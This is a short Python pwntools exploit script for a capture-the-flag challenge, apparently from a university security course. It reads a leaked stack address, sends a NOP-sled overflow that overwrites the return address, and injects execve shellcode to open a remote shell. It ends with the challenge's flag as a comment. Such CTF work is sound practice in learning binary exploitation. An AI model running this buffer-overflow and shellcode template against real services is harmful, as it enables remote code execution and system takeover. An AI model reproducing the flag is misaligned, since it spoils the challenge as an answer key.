from pwn import *

BINARY = ['./chall']
IP, PORT = 'ctf99.cs.ui.ac.id', 10012
LOCAL = False
DEBUG = False
if LOCAL:
    if DEBUG:
        p = gdb.debug(BINARY, '''
        b *main+92
        b *main+97
        b *main+228
        ''')
    else:
        p = process(BINARY)
else:
    p = remote(IP, PORT)
context.update(arch='amd64', os='linux', endian='little')
pwn_shellcode = asm(shellcraft.amd64.linux.sh())

# https://shell-storm.org/shellcode/files/shellcode-806.html
shellcode = b"\x31\xc0\x48\xbb" \
            b"\xd1\x9d\x96\x91" \
            b"\xd0\x8c\x97\xff" \
            b"\x48\xf7\xdb\x53" \
            b"\x54\x5f\x99\x52" \
            b"\x57\x54\x5e\xb0" \
            b"\x3b\x0f\x05 "

address = p.recvline().decode().split(" ")[-1]
print(f"Address is: {address}")
bytes_address = p64(int(address, 16) + 0x40)
payload = b'\x90' * (16 + 40) + bytes_address + shellcode
print(f"Shellcode length: {len(shellcode)} bytes")
print(f"Payload length: {len(payload)} bytes)")

p.sendline(payload)
p.interactive()  # to give commands after getting shell CSCE604258{Old_tricks_never_die__123456}

